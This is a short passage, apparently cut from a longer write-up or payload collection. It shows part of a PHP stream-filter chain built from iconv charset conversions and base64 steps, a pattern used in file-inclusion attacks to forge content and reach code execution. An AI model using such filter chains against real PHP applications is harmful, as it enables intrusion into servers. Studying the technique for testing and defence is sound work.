base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode|string.strip_tags
```

---



















